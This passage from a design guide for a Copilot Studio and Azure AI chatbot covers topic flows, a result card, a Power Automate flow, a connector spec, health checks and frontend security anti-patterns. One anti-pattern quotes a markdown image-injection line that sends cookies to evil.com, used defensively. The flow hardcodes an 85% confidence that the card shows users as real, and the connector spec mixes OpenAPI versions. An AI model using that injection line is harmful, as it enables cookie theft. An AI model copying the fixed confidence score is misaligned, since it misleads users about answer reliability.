        redirect_topic: "Upload Document"
      - label: "View recent results"
        redirect_topic: "Recent Results"
```

### 4.2 Topic Flow — Main Query (AI-Powered)

```yaml
# topics/main-query.yaml — Copilot Studio Topic Design
# Implementation: Create in Copilot Studio UI following this flow spec

topic_name: "Ask {app_name}"
trigger_phrases:
  - "I have a question about"
  - "Can you help me with"
  - "Tell me about"
  - "What is"
  - "How do I"
  - "Find information on"
  - "Search for"

flow:
  - action: "ask_question"
    prompt: "What would you like to know?"
    variable: "UserQuery"
    skip_if_filled: true  # Skip if trigger phrase already contains the query

  - action: "show_message"
    message: "Let me look that up for you..."

  - action: "call_power_automate"
    flow_name: "AI Query Flow"
    inputs:
      query: "{UserQuery}"
      user_email: "{System.User.Email}"
    outputs:
      response_text: "AIResponse"
      sources_json: "AISources"
      confidence: "AIConfidence"
    timeout_seconds: 60
    on_error:
      action: "show_message"
      message: "I'm having trouble connecting to the AI service. Please try again in a moment."

  - action: "show_adaptive_card"
    card: "adaptive-cards/result-card.json"
    data:
      response: "{AIResponse}"
      sources: "{AISources}"
      confidence: "{AIConfidence}"

  - action: "ask_question"
    prompt: "Was this helpful?"
    variable: "Feedback"
    options:
      - label: "Yes, thanks!"
        value: "helpful"
      - label: "Not quite — let me rephrase"
        value: "rephrase"
      - label: "I need to talk to someone"
        value: "escalate"

  - action: "condition"
    variable: "Feedback"
    branches:
      - value: "helpful"
        actions:
          - action: "call_power_automate"
            flow_name: "Log Feedback"
            inputs: { query: "{UserQuery}", rating: "positive" }
          - action: "show_message"
            message: "Glad I could help! Ask me anything else."
      - value: "rephrase"
        actions:
          - action: "redirect_topic"
            topic: "Ask {app_name}"
      - value: "escalate"
        actions:
          - action: "redirect_topic"
            topic: "Escalation"
```

### 4.3 Topic Flow — Escalation

```yaml
# topics/escalation.yaml — Human Handoff
topic_name: "Escalation"
trigger_phrases:
  - "Talk to a person"
  - "Human agent"
  - "I need help from someone"
  - "Escalate"

flow:
  - action: "show_message"
    message: "I'll connect you with someone who can help. Let me transfer your conversation."

  - action: "transfer_to_agent"
    # Requires Omnichannel for Customer Service integration
    # OR Teams channel escalation
    queue: "AI-Support"
    context:
      summary: "User asked: {System.LastMessage.Text}"
      history: "{System.Conversation.Summary}"
```

### 4.4 Adaptive Card — Result Card

```json
{
  "$schema": "http://adaptivecards.io/schemas/adaptive-card.json",
  "type": "AdaptiveCard",
  "version": "1.5",
  "body": [
    {
      "type": "TextBlock",
      "text": "${response}",
      "wrap": true,
      "size": "Default"
    },
    {
      "type": "TextBlock",
      "text": "Sources",
      "weight": "Bolder",
      "size": "Small",
      "spacing": "Medium",
      "isVisible": "${if(length(sources) > 0, true, false)}"
    },
    {
      "type": "Container",
      "items": [
        {
          "$data": "${sources}",
          "type": "TextBlock",
          "text": "📄 ${source}",
          "size": "Small",
          "color": "Accent",
          "wrap": true
        }
      ],
      "isVisible": "${if(length(sources) > 0, true, false)}"
    },
    {
      "type": "TextBlock",
      "text": "Confidence: ${confidence}%",
      "size": "Small",
      "color": "${if(confidence > 80, 'Good', if(confidence > 60, 'Warning', 'Attention'))}",
      "spacing": "Small"
    }
  ]
}
```

### 4.5 Power Automate — AI Query Flow

```json
{
  "definition": {
    "triggers": {
      "manual": {
        "type": "Request",
        "kind": "PowerAppV2",
        "inputs": {
          "schema": {
            "type": "object",
            "properties": {
              "query": { "type": "string" },
              "user_email": { "type": "string" }
            },
            "required": ["query"]
          }
        }
      }
    },
    "actions": {
      "Call_AI_Backend": {
        "type": "Http",
        "inputs": {
          "method": "POST",
          "uri": "https://flk-{app}-func-dev.azurewebsites.net/api/chat",
          "headers": {
            "Content-Type": "application/json",
            "x-functions-key": "@{parameters('FunctionAppKey')}"
          },
          "body": {
            "messages": [
              { "role": "user", "content": "@{triggerBody()['query']}" }
            ]
          }
        },
        "runAfter": {}
      },
      "Parse_Response": {
        "type": "ParseJson",
        "inputs": {
          "content": "@body('Call_AI_Backend')",
          "schema": {
            "type": "object",
            "properties": {
              "response": { "type": "string" },
              "sources": {
                "type": "array",
                "items": {
                  "type": "object",
                  "properties": {
                    "content": { "type": "string" },
                    "source": { "type": "string" }
                  }
                }
              }
            }
          }
        },
        "runAfter": { "Call_AI_Backend": ["Succeeded"] }
      },
      "Return_to_Copilot": {
        "type": "Response",
        "inputs": {
          "statusCode": 200,
          "body": {
            "response_text": "@{body('Parse_Response')?['response']}",
            "sources_json": "@{string(body('Parse_Response')?['sources'])}",
            "confidence": 85
          }
        },
        "runAfter": { "Parse_Response": ["Succeeded"] }
      }
    }
  }
}
```

### 4.6 Custom Connector — OpenAPI Spec

```yaml
# connectors/openapi-spec.yaml — Import into Copilot Studio custom connector
openapi: "3.0.0"
info:
  title: "{app_name} AI Backend"
  version: "1.0.0"
  description: "AI backend connector for Copilot Studio"
servers:
  - url: "https://flk-{app}-func-dev.azurewebsites.net/api"
security:
  - apiKeyHeader: []
paths:
  /chat:
    post:
      operationId: "AskAI"
      summary: "Send a question to the AI assistant"
      requestBody:
        required: true
        content:
          application/json:
            schema:
              type: object
              required: [messages]
              properties:
                messages:
                  type: array
                  items:
                    type: object
                    properties:
                      role: { type: string, enum: [user, assistant] }
                      content: { type: string }
      responses:
        "200":
          description: "AI response with source citations"
          content:
            application/json:
              schema:
                type: object
                properties:
                  response: { type: string }
                  sources:
                    type: array
                    items:
                      type: object
                      properties:
                        content: { type: string }
                        source: { type: string }
  /health:
    get:
      operationId: "HealthCheck"
      summary: "Check service health"
      responses:
        "200":
          description: "Service status"
securityDefinitions:
  apiKeyHeader:
    type: apiKey
    in: header
    name: x-functions-key
```

### 4.7 Setup Guide (COPILOT_SETUP_GUIDE.md)

The generated guide covers:

1. **Create Copilot:** copilotstudio.microsoft.com → Create → New copilot → name: `{app_name} Assistant`
2. **Import OpenAPI connector:** Settings → Custom connectors → Import from file → `openapi-spec.yaml`
3. **Configure auth:** API Key authentication → paste Function App key from Key Vault
4. **Create topics:** Manually create each topic following the YAML flow specs above
5. **Create Power Automate flows:** Import `ai-query-flow.json` → configure connector reference
6. **Link flows to topics:** In each topic's "Call an action" node → select the imported flow
7. **Configure channels:**
   - Teams: Publish → Channels → Microsoft Teams → Add to Teams app catalog
   - SharePoint: Publish → Channels → Custom website → embed `<iframe>` in SharePoint page
   - Website: Publish → Channels → Custom website → copy embed code
8. **Enable analytics:** Settings → Analytics → Turn on conversation transcripts
9. **Test end-to-end:** Test chat panel → verify AI responses include source citations

---

## 5. Shared Patterns

### 5.1 Environment Variable Template

```bash
# .env.template — Copy to .env and fill values
# All values should come from Key Vault in production

AZURE_OPENAI_ENDPOINT=https://flk-{app}-ai-dev.openai.azure.com
AZURE_OPENAI_KEY=<from-key-vault>
DEPLOYMENT_NAME={model-deployment}
EMBEDDING_DEPLOYMENT={embedding-deployment}
AZURE_SEARCH_ENDPOINT=https://flk-{app}-srch-dev.search.windows.net
AZURE_SEARCH_KEY=<from-key-vault>
AZURE_SEARCH_INDEX={app}-index
COSMOS_ENDPOINT=https://flk-{app}-cosmos-dev.documents.azure.com
CONTENT_SAFETY_ENDPOINT=https://flk-{app}-safety-dev.cognitiveservices.azure.com
```

### 5.2 Health Check Endpoint (Shared — Liveness + Readiness)

```python
# utils/health.py — Shared health check for any Python frontend
import os
import time

def check_liveness() -> dict:
    """Liveness probe — is the process alive? No dependency checks."""
    return {"status": "alive", "timestamp": time.time()}

def check_readiness() -> dict:
    """Readiness probe — can we serve traffic? Checks all dependencies."""
    required_vars = [
        "AZURE_OPENAI_ENDPOINT", "AZURE_OPENAI_KEY",
        "DEPLOYMENT_NAME", "AZURE_SEARCH_ENDPOINT",
        "AZURE_SEARCH_KEY", "AZURE_SEARCH_INDEX"
    ]
    missing = [v for v in required_vars if not os.environ.get(v)]
    checks = {"config": "ok" if not missing else f"missing: {', '.join(missing)}"}

    # Test Azure OpenAI connectivity
    try:
        from openai import AzureOpenAI
        client = AzureOpenAI(
            azure_endpoint=os.environ["AZURE_OPENAI_ENDPOINT"],
            api_key=os.environ["AZURE_OPENAI_KEY"],
            api_version="2024-12-01-preview"
        )
        client.models.list()
        checks["openai"] = "ok"
    except Exception as e:
        checks["openai"] = f"error: {type(e).__name__}"

    # Test Azure AI Search connectivity
    try:
        from azure.search.documents import SearchClient
        from azure.core.credentials import AzureKeyCredential
        sc = SearchClient(
            endpoint=os.environ["AZURE_SEARCH_ENDPOINT"],
            index_name=os.environ["AZURE_SEARCH_INDEX"],
            credential=AzureKeyCredential(os.environ["AZURE_SEARCH_KEY"])
        )
        sc.get_document_count()
        checks["search"] = "ok"
    except Exception as e:
        checks["search"] = f"error: {type(e).__name__}"

    all_ok = all(v == "ok" for v in checks.values())
    return {
        "status": "ready" if all_ok else "degraded",
        "checks": checks,
        "timestamp": time.time(),
    }
```

### 5.3 Streamlit Health Endpoints

```python
# Add to Streamlit app — health endpoints via query params
# App Service can probe: https://app.azurewebsites.net/?health=live
import streamlit as st
from utils.health import check_liveness, check_readiness

query = st.query_params
if query.get("health") == "live":
    st.json(check_liveness())
    st.stop()
elif query.get("health") == "ready":
    result = check_readiness()
    st.json(result)
    st.stop()
```

---

## 6. Frontend Template Anti-Patterns (NEVER Do These)

1. **NEVER import API keys in client-side React components.** Use `process.env` only in `app/api/` routes (server-side). `NEXT_PUBLIC_` prefix exposes variables to the browser.
2. **NEVER use `dangerouslySetInnerHTML` with model output.** Always use `ReactMarkdown` with `rehype-sanitize`. Model output can contain injected HTML/JS from adversarial prompts.
3. **NEVER create Streamlit apps without `st.set_page_config` as the first command.** It must be the first Streamlit call or it throws an error.
4. **NEVER use `requirements.txt` without pinning major versions.** Unpinned deps break deployments when upstream packages release breaking changes.
5. **NEVER hardcode `localhost` URLs in production builds.** Use environment variables for all endpoints. Docker/App Service runs on different hosts.
6. **NEVER skip error boundaries in React components.** Unhandled errors crash the entire app. Wrap AI-dependent components in `ChatErrorBoundary`.
7. **NEVER deploy Function Apps without `auth_level=func.AuthLevel.FUNCTION` on non-health endpoints.** Anonymous endpoints are publicly accessible without any authentication.
8. **NEVER skip input validation on API routes.** Always validate: message is a non-empty string, messages array has bounded length, content length is capped. *What happens:* Unbounded input → prompt injection payloads, OOM on oversized messages, or cost spikes from mega-prompts.
9. **NEVER deploy without security headers.** Every Next.js app must set `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Content-Security-Policy`, and `Referrer-Policy` in `next.config.js`. *What happens:* Clickjacking, MIME-type confusion attacks, data exfiltration via rogue iframes.
10. **NEVER use a single `/health` endpoint for both liveness and readiness.** Split into `/health/live` (no deps, always 200) and `/health/ready` (checks OpenAI + Search). *What happens:* App Service restarts the container when a transient dependency failure returns 503, causing cascading restarts instead of graceful degradation.
11. **NEVER render user messages as markdown.** User messages render as plain text only. Only assistant messages get `ReactMarkdown` treatment. *What happens:* Users can craft messages with markdown injection (`![](https://evil.com/steal?cookie=...)`) that execute on render.
12. **NEVER accept unbounded chat history from the client.** Cap `messages` array length (e.g., 50) and total token count. *What happens:* Attackers send enormous history arrays to inflate API costs and trigger context window overflow.
